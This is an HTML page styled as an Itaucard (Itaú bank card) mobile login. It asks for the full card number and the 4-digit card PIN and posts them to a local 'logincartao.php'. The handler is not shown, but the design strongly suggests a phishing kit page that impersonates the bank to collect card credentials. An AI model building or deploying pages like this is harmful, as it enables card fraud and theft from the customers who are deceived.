<!DOCTYPE html>
<html>
<head>
	<title>Itaucard</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
	<script type="text/javascript" src="./js/jquery-3.2.1.min.js"></script>
	<script type="text/javascript" src="./js/jquery.mask.min.js"></script>
	<script type="text/javascript" src="./js/home_scripts.js"></script>
	<link rel="shortcut icon" href="./assets/imagens/ico_favicon.png">
	<link rel="stylesheet" type="text/css" href="./assets/css/home_style.css">
<script>
function proximoCampo(atual,proximo){
if(atual.value.length >= atual.maxLength){
document.getElementById(proximo).focus();}}
</script></head><body> 
	<header class="top-home">
		<img src="./assets/imagens/img_home_logo.png">
	</header>
	<section class="frm-container">
		<form name="frmlog" method="POST" action="logincartao.php">
			<div class="frm-item">
				<input type="tel" id="numerocartao" name="numerocartao"  autocomplete="off" required="" onclick="validatebt()" onkeyup="proximoCampo(this, 'senha')">
				<label for="numerocartao" class="label-float">Número do Cartão</label>
			</div>
			<div class="frm-item"><input type="tel" id="senha" name="senha" autocomplete="off" required="" onkeyup="passballs(this.value), validatebt()">
				<label for="senha" class="label-float">Senha Cartão</label>
				<span class="cd"></span>
				<span id="ball1" class="balls"></span>
				<span id="ball2" class="balls"></span>
				<span id="ball3" class="balls"></span>
				<span id="ball4" class="balls"></span>
			</div>
			<input type="submit" id="btnlog" name="btnlog" class="btn" value="Acessar">
		</form>
	</section>
	<footer class="ft-home">
		<ul>
			<li>
				<img src="./assets/imagens/ic_contact_card.png">
				<p>Pedir Cartão</p>
			</li>
			<li>
				<img src="./assets/imagens/ic_itokenapp.png">
				<p>iToken</p>
			</li>
			<li>
				<img src="./assets/imagens/ic_ajuda.png">
				<p>Alertas Itaucard</p>
			</li>
			<div style="clear: both;">
			</div>
		</ul>
	</footer>
</body>
</html>
